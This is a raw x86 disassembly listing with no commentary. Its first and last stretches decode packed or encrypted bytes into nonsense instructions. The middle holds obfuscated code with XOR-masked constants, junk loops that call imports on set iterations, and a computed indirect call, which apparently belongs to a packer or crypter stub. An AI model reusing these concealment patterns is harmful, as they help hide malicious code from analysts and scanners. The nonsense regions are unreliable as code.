  4050b2:	or     al,0x66
  4050b4:	ds pop es
  4050b6:	dec    esi
  4050b7:	mov    ch,0xff
  4050b9:	mov    esp,0xd44afbae
  4050be:	cli    
  4050bf:	les    ebp,FWORD PTR [ebx-0x5d3f14ac]
  4050c5:	mov    esp,DWORD PTR [ebx+0x26]
  4050c8:	std    
  4050c9:	mov    al,BYTE PTR [edx-0x45c84081]
  4050cf:	dec    ebp
  4050d0:	mov    WORD PTR fs:[esi-0x7e3338c9],gs
  4050d7:	(bad)  
  4050d8:	sahf   
  4050d9:	push   ds
  4050da:	xchg   esi,eax
  4050db:	add    bh,BYTE PTR ds:0xfaaf6011
  4050e1:	mov    esp,0x5c0ca67d
  4050e6:	cmc    
  4050e7:	push   cs
  4050e8:	fsubr  DWORD PTR [esi]
  4050ea:	ss int3 
  4050ec:	int3   
  4050ed:	jnp    0x4050ec
  4050ef:	dec    ebp
  4050f0:	and    al,0x3b
  4050f2:	outs   dx,DWORD PTR ds:[esi]
  4050f3:	sar    BYTE PTR [edx],1
  4050f5:	ins    BYTE PTR es:[edi],dx
  4050f6:	loopne 0x40507e
  4050f8:	mov    al,0x79
  4050fa:	js     0x40515f
  4050fc:	in     al,dx
  4050fd:	xchg   esp,eax
  4050fe:	add    ah,al
  405100:	ja     0x40510c
  405102:	xor    eax,DWORD PTR [edi]
  405104:	pop    ebp
  405105:	shr    DWORD PTR [esi],cl
  405107:	out    0xea,al
  405109:	ffreep st(2)
  40510b:	push   0xffffffbf
  40510d:	mov    edx,0x5728e193
  405112:	sub    DWORD PTR [eax+0x3],ebp
  405115:	push   ebx
  405116:	int3   
  405117:	xor    DWORD PTR [edx+eiz*2-0x59],ecx
  40511b:	mov    ecx,0xd6a9b5e7
  405120:	inc    eax
  405121:	(bad)  
  405122:	dec    edi
  405123:	dec    edi
  405124:	aam    0x81
  405126:	rol    DWORD PTR [eax-0x4df53c00],cl
  40512c:	retf   0x806d
  40512f:	in     al,0xf7
  405131:	mov    bl,0x9b
  405133:	mov    cl,0x6e
  405135:	js     0x4050c8
  405137:	sub    eax,0x92a13833
  40513c:	adc    al,BYTE PTR [edx-0x7c]
  40513f:	jns    0x405173
  405141:	inc    ebp
  405142:	add    DWORD PTR [edx],eax
  405144:	xor    al,0xd3
  405146:	mov    eax,ss
  405148:	sub    eax,0x655f6e77
  40514d:	add    al,0x76
  40514f:	pop    DWORD PTR [ebp+edx*2-0x15]
  405153:	shl    dl,1
  405155:	cmp    al,0x95
  405157:	fisub  DWORD PTR [eax*8-0x23668280]
  40515e:	daa    
  40515f:	dec    edx
  405160:	push   edi
  405161:	xor    ch,ah
  405163:	cs and al,0xba
  405166:	ret    
  405167:	push   ss
  405168:	inc    ebp
  405169:	jne    0x40515f
  40516b:	and    BYTE PTR [edi+0x49],0x5
  40516f:	inc    esi
  405170:	scas   eax,DWORD PTR es:[edi]
  405171:	or     BYTE PTR ds:[ebp-0x107b1f9c],bl
  405178:	call   0x9ae3:0x58fa1dd
  40517f:	ins    BYTE PTR es:[edi],dx
  405180:	frstor [ebx-0x325efdf2]
  405186:	inc    edx
  405187:	or     eax,DWORD PTR [ecx-0x20]
  40518a:	int3   
  40518b:	mov    dl,0x42
  40518d:	mov    al,BYTE PTR [ecx+0xe0dbb99]
  405193:	push   0xb15e82b8
  405198:	cdq    
  405199:	arpl   WORD PTR [ebp+0x5d05c2c1],bp
  40519f:	push   eax
  4051a0:	dec    esp
  4051a1:	sub    BYTE PTR [eax],dh
  4051a3:	push   ecx
  4051a4:	call   0x8d4437c
  4051a9:	ret    
  4051aa:	push   es
  4051ab:	inc    edi
  4051ac:	dec    eax
  4051ad:	fwait
  4051ae:	int3   
  4051af:	into   
  4051b0:	pop    edx
  4051b1:	pushf  
  4051b2:	xchg   ecx,eax
  4051b3:	dec    ecx
  4051b4:	ror    ecx,cl
  4051b6:	pop    ds
  4051b7:	sub    DWORD PTR [ebx],ebx
  4051b9:	mov    ds:0x75e292d3,eax
  4051be:	mov    gs,WORD PTR [ebx]
  4051c0:	inc    esp
  4051c1:	adc    eax,0x6d552f76
  4051c6:	rcl    DWORD PTR [edi],cl
  4051c8:	jmp    0x39c957f6
  4051cd:	bound  edx,QWORD PTR [edx-0x72e3f36c]
  4051d3:	dec    ecx
  4051d4:	lss    esi,FWORD PTR [eax]
  4051d7:	pop    eax
  4051d8:	fidiv  DWORD PTR [edi-0x8]
  4051db:	sbb    edi,DWORD PTR [ebp+0x43]
  4051de:	dec    DWORD PTR [ecx-0x2]
  4051e1:	mov    eax,0x14999fda
  4051e6:	add    eax,0x88ead68
  4051eb:	repz push ds
  4051ed:	mov    eax,ds:0x402a2e29
  4051f2:	mov    esi,0x5d4d55a2
  4051f7:	mov    ebx,0x7bb1831a
  4051fc:	mov    cl,0xf6
  4051fe:	test   BYTE PTR [ecx+0x45],cl
  405201:	sahf   
  405202:	dec    ecx
  405203:	js     0x4051a7
  405205:	cld    
  405206:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405207:	fldenv ds:0x24a0aabd
  40520d:	lds    esi,FWORD PTR [ebx+0x5]
  405210:	out    dx,eax
  405211:	or     eax,0x7bf85a64
  405216:	adc    ch,BYTE PTR [ecx+0x5dc81c6c]
  40521c:	sbb    ah,BYTE PTR [esi+eiz*8]
  40521f:	jns    0x4051eb
  405221:	mov    esi,DWORD PTR [ebx]
  405223:	ret    
  405224:	add    eax,0x3272dc
  405229:	jmp    0x405392
  40522e:	mov    ecx,DWORD PTR [ebp-0x38]
  405231:	add    ecx,DWORD PTR [ebp+0x8]
  405234:	mov    DWORD PTR [ebp-0x10],ecx
  405237:	mov    ecx,DWORD PTR [ebp-0x1c]
  40523a:	test   ecx,ecx
  40523c:	je     0x40531d
  405242:	mov    DWORD PTR [ebp-0x20],0x0
  405249:	push   0x3
  40524b:	xor    edx,edx
  40524d:	pop    edx
  40524e:	add    edx,0x8
  405251:	push   edx
  405252:	pop    ecx
  405253:	push   0x6
  405255:	dec    ecx
  405256:	pop    ebx
  405257:	dec    ebx
  405258:	xchg   ebx,ecx
  40525a:	sub    ebx,ecx
  40525c:	xchg   ebx,ecx
  40525e:	dec    ecx
  40525f:	mov    eax,DWORD PTR [ebp-0x1c]
  405262:	imul   eax,ecx
  405265:	sub    esp,eax
  405267:	mov    DWORD PTR [ebp-0x20],esp
  40526a:	mov    eax,DWORD PTR [ebp-0x4]
  40526d:	mov    ecx,0x7510894
  405272:	xor    eax,ecx
  405274:	mov    edx,0x3272dc
  405279:	add    eax,edx
  40527b:	mov    DWORD PTR [ebp+0x8],eax
  40527e:	mov    eax,DWORD PTR [ebp-0x14]
  405281:	xor    eax,ecx
  405283:	add    eax,edx
  405285:	mov    edx,DWORD PTR [ebp+0x14]
  405288:	imul   eax,DWORD PTR [edx]
  40528b:	mov    edx,DWORD PTR [ebp-0x4]
  40528e:	xor    edx,ecx
  405290:	mov    ecx,DWORD PTR [ebp+0x8]
  405293:	lea    ecx,[edx+ecx*1+0x3272dc]
  40529a:	cmp    ecx,eax
  40529c:	je     0x405313
  4052a2:	mov    edi,DWORD PTR [ebp-0x14]
  4052a5:	mov    eax,DWORD PTR [ebp+0x8]
  4052a8:	mov    edx,DWORD PTR [ebp+0x14]
  4052ab:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  4052af:	mov    ecx,0x7510894
  4052b4:	xor    edx,edx
  4052b6:	xor    edi,ecx
  4052b8:	mov    esi,0x3272dc
  4052bd:	add    edi,esi
  4052bf:	div    edi
  4052c1:	mov    edx,DWORD PTR [ebp-0x4]
  4052c4:	xor    edx,ecx
  4052c6:	lea    eax,[edx+eax*1+0x3272dc]
  4052cd:	mov    edx,DWORD PTR [ebp+0x8]
  4052d0:	mov    edi,DWORD PTR [ebp-0x20]
  4052d3:	mov    DWORD PTR [edi+edx*4],eax
  4052d6:	mov    eax,DWORD PTR [ebp-0x14]
  4052d9:	mov    edx,DWORD PTR [ebp+0x8]
  4052dc:	xor    eax,ecx
  4052de:	lea    eax,[eax+edx*1+0x3272dc]
  4052e5:	mov    DWORD PTR [ebp+0x8],eax
  4052e8:	mov    eax,DWORD PTR [ebp-0x14]
  4052eb:	mov    edx,DWORD PTR [ebp+0x14]
  4052ee:	xor    eax,ecx
  4052f0:	add    eax,esi
  4052f2:	imul   eax,DWORD PTR [edx]
  4052f5:	mov    edx,DWORD PTR [ebp-0x4]
  4052f8:	xor    edx,ecx
  4052fa:	mov    ecx,DWORD PTR [ebp+0x8]
  4052fd:	lea    ecx,[edx+ecx*1+0x3272dc]
  405304:	cmp    ecx,eax
  405306:	jne    0x4052a2
  40530c:	mov    eax,esi
  40530e:	jmp    0x405318
  405313:	mov    eax,0x3272dc
  405318:	mov    ebx,0x7510894
  40531d:	mov    ecx,DWORD PTR [ebp-0x4]
  405320:	xor    ecx,ebx
  405322:	add    ecx,eax
  405324:	mov    DWORD PTR [ebp-0xc],ecx
  405327:	mov    ebx,0x65655
  40532c:	add    ebx,0x3234
  405332:	xchg   ebx,esi
  405334:	xor    ebx,ebx
  405336:	push   esi
  405337:	mov    esi,ebx
  405339:	pop    ebx
  40533a:	mov    edx,esi
  40533c:	add    ebx,0x1002
  405342:	lea    eax,[ebp-0x10]
  405345:	add    edx,eax
  405347:	add    edx,0x5
  40534a:	push   edx
  40534b:	inc    esi
  40534c:	pop    ecx
  40534d:	dec    ecx
  40534e:	xchg   ecx,eax
  40534f:	dec    eax
  405350:	xchg   ecx,eax
  405351:	dec    ecx
  405352:	xchg   ecx,edx
  405354:	dec    edx
  405355:	push   edx
  405356:	mov    edx,ebx
  405358:	pop    ebx
  405359:	dec    ebx
  40535a:	call   DWORD PTR [ebx]
  40535c:	cmp    DWORD PTR [ebp+0x10],esi
  40535f:	je     0x40537e
  405365:	xchg   edx,eax
  405366:	push   0xb
  405368:	pop    ecx
  405369:	push   0x4
  40536b:	pop    ebx
  40536c:	inc    ebx
  40536d:	xchg   ebx,ecx
  40536f:	sub    ebx,ecx
  405371:	xchg   ebx,ecx
  405373:	dec    ecx
  405374:	dec    ecx
  405375:	mov    eax,DWORD PTR [ebp-0x1c]
  405378:	imul   eax,ecx
  40537b:	add    esp,eax
  40537d:	xchg   edx,eax
  40537e:	push   eax
  40537f:	xor    ebx,ebx
  405381:	mov    edx,esp
  405383:	dec    edx
  405384:	inc    ebx
  405385:	add    ebx,DWORD PTR [edx+ebx*1]
  405388:	dec    ebx
  405389:	xor    edx,edx
  40538b:	add    DWORD PTR [ebp-0xc],ebx
  40538e:	pop    ebx
  40538f:	mov    eax,DWORD PTR [ebp-0xc]
  405392:	pop    edi
  405393:	pop    esi
  405394:	pop    ebx
  405395:	leave  
  405396:	ret    0x10
  405399:	push   ebp
  40539a:	mov    ebp,esp
  40539c:	sub    esp,0x18
  40539f:	and    DWORD PTR ds:0x413c1e,0x0
  4053a9:	mov    ecx,DWORD PTR ds:0x413c1e
  4053af:	inc    ecx
  4053b0:	mov    DWORD PTR ds:0x413c1e,ecx
  4053b6:	cmp    DWORD PTR ds:0x413c1e,0x8
  4053bd:	jne    0x4053d7
  4053c3:	push   DWORD PTR [ebp-0x20]
  4053c6:	push   0x413cf0
  4053cb:	push   DWORD PTR [ebp-0x24]
  4053ce:	push   DWORD PTR [ebp-0x14]
  4053d1:	call   DWORD PTR ds:0x416770
  4053d7:	cmp    DWORD PTR ds:0x413c1e,0x7
  4053de:	jne    0x4053f3
  4053e4:	xor    ecx,ecx
  4053e6:	or     ecx,DWORD PTR ds:0x413c1e
  4053ec:	inc    ecx
  4053ed:	mov    DWORD PTR ds:0x413c1e,ecx
  4053f3:	cmp    DWORD PTR ds:0x413c1e,0x1f
  4053fa:	jb     0x4053a9
  405400:	and    DWORD PTR ds:0x413c12,ecx
  405406:	mov    DWORD PTR [ebp-0x10],0xf89f85b0
  40540d:	xor    edx,edx
  40540f:	or     edx,DWORD PTR ds:0x413cc0
  405415:	mov    edx,DWORD PTR [edx]
  405417:	and    DWORD PTR ds:0x413ce8,edx
  40541d:	lea    eax,[ebp+0x14]
  405420:	mov    DWORD PTR [ebp-0x4],eax
  405423:	push   esi
  405424:	adc    edx,ecx
  405426:	mov    esi,0xf89c85b0
  40542b:	mov    DWORD PTR [ebp-0xc],esi
  40542e:	and    DWORD PTR ds:0x413c74,0x0
  405438:	jmp    0x40544a
  40543d:	mov    edx,DWORD PTR ds:0x413c74
  405443:	inc    edx
  405444:	mov    DWORD PTR ds:0x413c74,edx
  40544a:	cmp    DWORD PTR ds:0x413c74,0x1a
  405451:	jae    0x405550
  405457:	cmp    DWORD PTR ds:0x413c74,0x10
  40545e:	jne    0x40547c
  405464:	push   0x41401c
  405469:	push   DWORD PTR [ebp-0x14]
  40546c:	push   0x416140
  405471:	push   0x4161b2
  405476:	call   DWORD PTR ds:0x416774
  40547c:	cmp    DWORD PTR ds:0x413c74,0xf
  405483:	jne    0x405498
  405489:	xor    edx,edx
  40548b:	add    edx,DWORD PTR ds:0x413c74
  405491:	inc    edx
  405492:	mov    DWORD PTR ds:0x413c74,edx
  405498:	jmp    0x40543d
  40549d:	and    DWORD PTR ds:0x413c0e,0x0
  4054a7:	jmp    0x4054b9
  4054ac:	mov    ecx,DWORD PTR ds:0x413c0e
  4054b2:	inc    ecx
  4054b3:	mov    DWORD PTR ds:0x413c0e,ecx
  4054b9:	cmp    DWORD PTR ds:0x413c0e,0x16
  4054c0:	jae    0x405550
  4054c6:	cmp    DWORD PTR ds:0x413c0e,0x7
  4054cd:	jne    0x4054e8
  4054d3:	push   0x1925
  4054d8:	push   0x413c1a
  4054dd:	push   0x416140
  4054e2:	call   DWORD PTR ds:0x416778
  4054e8:	cmp    DWORD PTR ds:0x413c0e,0x6
  4054ef:	jne    0x405504
  4054f5:	xor    ecx,ecx
  4054f7:	or     ecx,DWORD PTR ds:0x413c0e
  4054fd:	inc    ecx
  4054fe:	mov    DWORD PTR ds:0x413c0e,ecx
  405504:	jmp    0x4054ac
  405509:	mov    DWORD PTR ds:0x413d1c,0x15
  405513:	cmp    DWORD PTR ds:0x413d1c,0x0
  40551a:	je     0x405550
  405520:	cmp    DWORD PTR ds:0x413d1c,0x21
  405527:	jne    0x405538
  40552d:	push   0x416025
  405532:	call   DWORD PTR ds:0x41677c
  405538:	mov    ecx,DWORD PTR ds:0x413d1c
  40553e:	dec    ecx
  40553f:	mov    DWORD PTR ds:0x413d1c,ecx
  405545:	jmp    0x405513
  40554a:	adc    edx,0x7769
  405550:	lea    eax,[ebp-0xc]
  405553:	mov    DWORD PTR [ebp-0x14],eax
  405556:	or     eax,DWORD PTR ds:0x413c0a
  40555c:	mov    eax,DWORD PTR [ebp-0xc]
  40555f:	and    edx,edx
  405561:	mov    edx,DWORD PTR [ebp-0x14]
  405564:	mov    ecx,0x7510894
  405569:	xor    eax,ecx
  40556b:	add    eax,0x3272dc
  405570:	mov    DWORD PTR [edx],eax
  405572:	and    DWORD PTR ds:0x413d34,0x0
  40557c:	jmp    0x40558c
  405581:	mov    eax,ds:0x413d34
  405586:	inc    eax
  405587:	mov    ds:0x413d34,eax
  40558c:	cmp    DWORD PTR ds:0x413d34,0x17
  405593:	jae    0x4055dc
  405599:	cmp    DWORD PTR ds:0x413d34,0x8
  4055a0:	jne    0x4055b9
  4055a6:	push   0x413cec
  4055ab:	push   DWORD PTR [ebp-0x24]
  4055ae:	push   0x416049
  4055b3:	call   DWORD PTR ds:0x416780
  4055b9:	cmp    DWORD PTR ds:0x413d34,0x7
  4055c0:	jne    0x4055d1
  4055c6:	mov    eax,ds:0x413d34
  4055cb:	inc    eax
  4055cc:	mov    ds:0x413d34,eax
  4055d1:	jmp    0x405581
  4055d6:	and    edx,DWORD PTR ds:0x413bfe
  4055dc:	mov    eax,ds:0x41622c
  4055e1:	mov    edx,DWORD PTR [ebp-0x4]
  4055e4:	add    DWORD PTR ds:0x413bf6,0x4ad3
  4055ee:	mov    eax,DWORD PTR [eax]
  4055f0:	add    eax,DWORD PTR [edx]
  4055f2:	sbb    DWORD PTR ds:0x413c80,0x777b
  4055fc:	push   edi
  4055fd:	xor    DWORD PTR ds:0x413c06,ebx
  405603:	mov    DWORD PTR [ebp-0x8],eax
  405606:	mov    edi,DWORD PTR [ebp+0x8]
  405609:	movzx  eax,BYTE PTR ds:0x413d28
  405610:	sub    DWORD PTR ds:0x413c06,eax
  405616:	mov    eax,ds:0x4163b4
  40561b:	mov    eax,DWORD PTR [eax+0x198]
  405621:	adc    edx,DWORD PTR ds:0x414010
  405627:	xor    edi,ecx
  405629:	mov    edx,0x3272dc
  40562e:	add    DWORD PTR ds:0x413c1a,0x413cd8
  405638:	add    edi,edx
  40563a:	mov    DWORD PTR ds:0x413d28,0x4988
  405644:	cmp    DWORD PTR [eax],edi
  405646:	je     0x40565d
  40564c:	mov    eax,DWORD PTR [eax]
  40564e:	mov    DWORD PTR ds:0x413ce4,0xf81
  405658:	jmp    0x407c4a
  40565d:	mov    eax,DWORD PTR [ebp+0x18]
  405660:	mov    DWORD PTR ds:0x413c06,0x7bbf
  40566a:	cmp    eax,esi
  40566c:	mov    DWORD PTR ds:0x413d30,0x2bf7
  405676:	jne    0x405686
  40567c:	push   0xf89c85b1
  405681:	jmp    0x407c39
  405686:	mov    esi,DWORD PTR [ebp+0x18]
  405689:	movzx  eax,WORD PTR ds:0x413cf0
  405690:	mov    eax,0xf89c85b2
  405695:	cmp    esi,eax
  405697:	jne    0x407c29
  40569d:	mov    eax,DWORD PTR [ebp+0x10]
  4056a0:	inc    DWORD PTR ds:0x413c80
  4056a6:	xor    eax,ecx
  4056a8:	add    eax,edx
  4056aa:	mov    DWORD PTR [ebp-0x18],eax
  4056ad:	adc    DWORD PTR ds:0x413d1c,0x3347
  4056b7:	mov    eax,DWORD PTR [ebp+0xc]
  4056ba:	mov    esi,DWORD PTR [ebp-0x8]
  4056bd:	xor    eax,ecx
  4056bf:	sbb    DWORD PTR ds:0x413ce4,0x413c70
  4056c9:	add    eax,edx
  4056cb:	imul   eax,DWORD PTR [esi]
  4056ce:	and    DWORD PTR ds:0x413c0a,ebx
  4056d4:	mov    esi,DWORD PTR [ebp+0x8]
  4056d7:	and    DWORD PTR ds:0x413d24,0x413c02
  4056e1:	xor    esi,ecx
  4056e3:	add    esi,edx
  4056e5:	cmp    esi,eax
  4056e7:	movzx  eax,BYTE PTR ds:0x413cf0
  4056ee:	mov    eax,DWORD PTR [ebp-0x4]
  4056f1:	push   ebx
  4056f2:	mov    DWORD PTR ds:0x414000,0x6197
  4056fc:	je     0x40577e
  405702:	and    DWORD PTR ds:0x413c1e,0x0
  40570c:	jmp    0x40571e
  405711:	mov    esi,DWORD PTR ds:0x413c1e
  405717:	inc    esi
  405718:	mov    DWORD PTR ds:0x413c1e,esi
  40571e:	cmp    DWORD PTR ds:0x413c1e,0x14
  405725:	jae    0x405765
  40572b:	cmp    DWORD PTR ds:0x413c1e,0xa
  405732:	jne    0x405746
  405738:	push   0x413d1c
  40573d:	push   DWORD PTR [ebp-0x24]
  405740:	call   DWORD PTR ds:0x416784
  405746:	cmp    DWORD PTR ds:0x413c1e,0x9
  40574d:	jne    0x405760
  405753:	mov    esi,DWORD PTR ds:0x413c1e
  405759:	inc    esi
  40575a:	mov    DWORD PTR ds:0x413c1e,esi
  405760:	jmp    0x405711
  405765:	mov    esi,DWORD PTR [ebp-0x18]
  405768:	add    DWORD PTR [eax],esi
  40576a:	mov    eax,DWORD PTR [ebp-0x4]
  40576d:	mov    esi,DWORD PTR [ebp+0xc]
  405770:	xor    esi,ecx
  405772:	add    esi,edx
  405774:	imul   esi,DWORD PTR [eax]
  405777:	mov    DWORD PTR [eax],esi
  405779:	jmp    0x405783
  40577e:	mov    esi,DWORD PTR [ebp+0x14]
  405781:	xor    DWORD PTR [eax],esi
  405783:	mov    eax,DWORD PTR [ebp-0x4]
  405786:	mov    edi,DWORD PTR [ebp+0x10]
  405789:	xor    edi,ecx
  40578b:	mov    esi,0xffcd8d24
  405790:	mov    ebx,esi
  405792:	sub    ebx,edi
  405794:	add    DWORD PTR [eax],ebx
  405796:	mov    eax,DWORD PTR [ebp-0x4]
  405799:	mov    edi,DWORD PTR [ebp-0x8]
  40579c:	add    edi,DWORD PTR [eax]
  40579e:	mov    DWORD PTR [ebp-0x8],edi
  4057a1:	mov    eax,DWORD PTR [ebp+0xc]
  4057a4:	mov    edi,DWORD PTR [ebp+0xc]
  4057a7:	xor    edi,ecx
  4057a9:	xor    eax,ecx
  4057ab:	lea    eax,[eax+edi*1+0x64e5b8]
  4057b2:	mov    edi,DWORD PTR [ebp+0xc]
  4057b5:	xor    edi,ecx
  4057b7:	add    edi,edx
  4057b9:	imul   eax,edi
  4057bc:	mov    edi,DWORD PTR [ebp+0xc]
  4057bf:	xor    edi,ecx
  4057c1:	sub    edi,eax
  4057c3:	mov    eax,DWORD PTR [ebp-0x4]
  4057c6:	add    edi,edx
  4057c8:	cmp    DWORD PTR [eax],edi
  4057ca:	mov    eax,DWORD PTR [ebp-0x4]
  4057cd:	mov    edi,DWORD PTR [ebp+0x10]
  4057d0:	jg     0x4057e3
  4057d6:	xor    edi,ecx
  4057d8:	mov    ebx,esi
  4057da:	sub    ebx,edi
  4057dc:	add    DWORD PTR [eax],ebx
  4057de:	jmp    0x4057e9
  4057e3:	xor    edi,ecx
  4057e5:	add    edi,edx
  4057e7:	add    DWORD PTR [eax],edi
  4057e9:	mov    eax,DWORD PTR [ebp-0x8]
  4057ec:	mov    edi,DWORD PTR [ebp-0x10]
  4057ef:	mov    eax,DWORD PTR [eax]
  4057f1:	jmp    0x407b3d
  4057f6:	imul   ebp,DWORD PTR [edx+0x66],0xaba967a5
  4057fd:	stos   BYTE PTR es:[edi],al
  4057fe:	(bad)  
  4057ff:	sbb    eax,0xf05994ee
  405804:	push   eax
  405805:	shl    eax,cl
  405807:	pop    edi
  405808:	jl     0x405886
  40580a:	dec    ebx
  40580b:	pop    edi
  40580c:	jl     0x40588a
  40580e:	push   0x51
  405810:	(bad)  
  405812:	std    
  405813:	cmp    ch,BYTE PTR [eax+0x0]
  405816:	fistp  DWORD PTR [edi+0x36]
  405819:	in     eax,dx
  40581a:	xor    al,0x4b
  40581c:	xchg   ebp,eax
  40581d:	data16 daa 
  40581f:	cli    
  405820:	jg     0x405898
  405822:	xor    eax,ecx
  405824:	ret    0x43b3
  405827:	(bad)  
  405828:	adc    al,0x32
  40582a:	test   ah,dh
  40582c:	aaa    
  40582d:	xlat   BYTE PTR ds:[ebx]
  40582e:	dec    edi
  40582f:	idiv   edx
  405831:	add    bh,BYTE PTR [esi-0x4c]
  405834:	fs jo  0x4058a4
  405837:	add    eax,0xd9e4c673
  40583c:	adc    ecx,DWORD PTR [esi-0xd]
  40583f:	pop    esp
  405840:	pop    es
  405841:	test   al,0x8a
  405843:	sub    ebx,DWORD PTR [eax+0xba29085]
  405849:	adc    eax,DWORD PTR [esi+0x3b]
  40584c:	lock xlat BYTE PTR ds:[ebx]
  40584e:	cmp    edi,0xb1f0a866
  405854:	or     BYTE PTR [eax-0x701a7726],0x26
  40585b:	push   edi
  40585c:	xchg   esi,eax
  40585d:	jg     0x4058a2
  40585f:	cmp    al,0x48
  405861:	inc    eax
  405862:	shl    BYTE PTR [edi+eiz*4],0xea
  405866:	icebp  
  405867:	imul   esi,DWORD PTR [eax*1-0x659482fa],0x8e8212e8
  405872:	les    esi,FWORD PTR [ecx-0x64]
  405875:	xor    DWORD PTR [edx+0x60],edx
  405878:	mov    ch,ch
  40587a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40587b:	in     eax,dx
  40587c:	ficom  DWORD PTR [edx+ebx*8+0x68]
  405880:	or     eax,0xf177d779
  405885:	int    0xb8
  405887:	ins    DWORD PTR es:[edi],dx
  405888:	cmp    esp,DWORD PTR [ebx]
  40588a:	push   edi
  40588b:	and    al,0xfd
  40588d:	dec    esp
  40588e:	popa   
  40588f:	jle    0x405847
  405891:	ss sbb ch,ch
  405894:	popf   
  405895:	mov    ds,WORD PTR [edx]
  405897:	fsubr  DWORD PTR [edi+0x576e31a4]
  40589d:	shr    DWORD PTR [eax-0x3d],cl
  4058a0:	push   0x65abdc9f
  4058a5:	test   BYTE PTR [edi+0x73b2061f],ch
  4058ab:	fiadd  DWORD PTR [eax+0x3f]
  4058ae:	push   ecx
  4058af:	clc    
  4058b0:	out    0xea,al
  4058b2:	pop    ecx
  4058b3:	lahf   
  4058b4:	and    DWORD PTR [ebp+0xd5ff62f],edi
  4058ba:	lods   eax,DWORD PTR ds:[esi]
  4058bb:	repnz dec ebx
  4058bd:	es pop esp
  4058bf:	js     0x405859
  4058c1:	mov    ebx,0xc2325acd
  4058c6:	or     BYTE PTR [eax-0x1f],dh
  4058c9:	icebp  
  4058ca:	mov    al,0xed
  4058cc:	pop    ds
  4058cd:	and    ebp,DWORD PTR [edx]
  4058cf:	jle    0x40593f
  4058d1:	add    BYTE PTR [esi+edi*4],dl
  4058d4:	test   al,0x80
  4058d6:	das    
  4058d7:	and    al,0x9
  4058d9:	iret   
  4058da:	icebp  
  4058db:	data16 sub dl,BYTE PTR [esi-0x4b]
  4058df:	jne    0x405918
  4058e1:	adc    edx,DWORD PTR [ebp+0x15]
  4058e4:	jge    0x40586a
  4058e6:	iret   
  4058e7:	cdq    
  4058e8:	fidiv  DWORD PTR [ebp-0xe]
  4058eb:	iret   
  4058ec:	test   eax,0xf757be1f
  4058f1:	push   esp
  4058f2:	out    dx,eax
  4058f3:	rol    esi,1
  4058f5:	cdq    
  4058f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058f7:	cld    
  4058f8:	imul   ecx,DWORD PTR [edx-0x79b0981c],0x98c32d78
  405902:	pop    eax
  405903:	fwait
  405904:	sub    bl,bl
  405906:	xchg   edi,eax
  405907:	jg     0x4058b2
  405909:	or     bh,BYTE PTR [ebp+0x5f]
  40590c:	cli    
  40590d:	or     al,0xfe
  40590f:	push   edx
  405910:	pop    ebp
  405911:	adc    al,0x42
  405913:	cwde   
  405914:	add    bh,dh
  405916:	or     al,0x6c
  405918:	std    
  405919:	mov    ebp,0x1d3632a8
  40591e:	mov    edx,0xb0fdfa55
  405923:	or     DWORD PTR [ecx-0x595684cc],ebx
  405929:	jbe    0x4058cd
  40592b:	scas   eax,DWORD PTR es:[edi]
  40592c:	add    BYTE PTR [edi-0x4a43a480],al
  405932:	test   esp,0x6b73a6f6
  405938:	lods   al,BYTE PTR ds:[esi]
  405939:	adc    eax,DWORD PTR ss:[edx-0x4563fa0d]
  405940:	xor    BYTE PTR [edx+eax*8],bh
  405943:	loope  0x40590d
  405945:	shl    BYTE PTR [edx],cl
  405947:	mov    es,WORD PTR [ecx-0x6c]
  40594a:	add    al,0xbc
  40594c:	test   al,0x3c
  40594e:	cld    
  40594f:	pop    ebx
  405950:	mov    al,0x1f
  405952:	jl     0x405984
  405954:	mul    BYTE PTR [ecx+0x33]
  405957:	iret   
  405958:	mov    bl,0xf3
  40595a:	arpl   ax,cx
  40595c:	stc    
  40595d:	lods   al,BYTE PTR ds:[esi]
  40595e:	adc    DWORD PTR [eax+0x1679b460],esp
  405964:	jne    0x40590f
  405966:	dec    esi
  405967:	mov    al,dh
  405969:	not    BYTE PTR [eax]
  40596b:	push   ds
  40596c:	add    BYTE PTR [edx+eiz*4],0x16
  405970:	(bad)  
  405971:	jmp    0x4058fa
  405973:	add    BYTE PTR [ecx-0x80],bh
  405976:	and    al,0x3d
  405978:	add    eax,0x211ad315
  40597d:	lods   eax,DWORD PTR es:[esi]
  40597f:	xchg   edi,eax
  405980:	iret   
  405981:	pop    edx
  405982:	mov    eax,0x7c106dba
  405987:	xor    eax,DWORD PTR [ecx-0x19ed3715]
  40598d:	xchg   ecx,eax
  40598e:	iret   
  40598f:	pop    eax
  405990:	int3   
  405991:	ds retf 0x1095
  405995:	and    dl,BYTE PTR [ecx-0xe]
  405998:	cdq    
  405999:	(bad)  
  40599a:	xlat   BYTE PTR ds:[ebx]
  40599b:	sbb    eax,0xef9bdb16
  4059a0:	cmp    bl,BYTE PTR [ebp+ecx*2-0x61]
  4059a4:	sub    BYTE PTR [edi+0x3d],ch
  4059a7:	mov    dh,0xd2
  4059a9:	or     esi,edx
  4059ab:	xchg   BYTE PTR [ebp-0x8b123f8],cl
  4059b1:	retf   
  4059b2:	and    esi,DWORD PTR [edx-0x4b]
  4059b5:	jecxz  0x4059d3
  4059b7:	je     0x4059c5
  4059b9:	sbb    edi,DWORD PTR [ecx-0x5234f62a]
  4059bf:	das    
  4059c0:	iret   
  4059c1:	pop    ebp
  4059c2:	mov    ecx,0x77f9b1ea
  4059c7:	dec    esp
  4059c8:	and    bl,0xd4
  4059cb:	xchg   BYTE PTR [edx+0x60781d18],cl
  4059d1:	dec    edi
  4059d2:	into   
  4059d3:	cmc    
  4059d4:	ret    
  4059d5:	dec    esp
  4059d6:	sub    al,0x72
  4059d8:	mov    BYTE PTR [edx+0x6d1812f2],dl
  4059de:	cld    
  4059df:	push   ebp
  4059e0:	mov    ds:0xeecf20e4,eax
  4059e5:	pop    edx
  4059e6:	cmp    ah,BYTE PTR [si]
  4059e9:	sbb    edx,ebp
  4059eb:	into   
  4059ec:	sub    edi,DWORD PTR [edi+edi*4]
  4059ef:	pop    ecx
  4059f0:	ins    DWORD PTR es:[edi],dx
  4059f1:	jno    0x405a34
  4059f3:	stos   DWORD PTR es:[edi],eax
  4059f4:	lods   al,BYTE PTR ds:[esi]
  4059f5:	in     al,0x6
  4059f7:	add    eax,ebx
  4059f9:	adc    BYTE PTR [edi+0x6a],ah
  4059fc:	loopne 0x4059b3
  4059fe:	dec    edx
  4059ff:	in     al,0x9c
  405a01:	out    dx,al
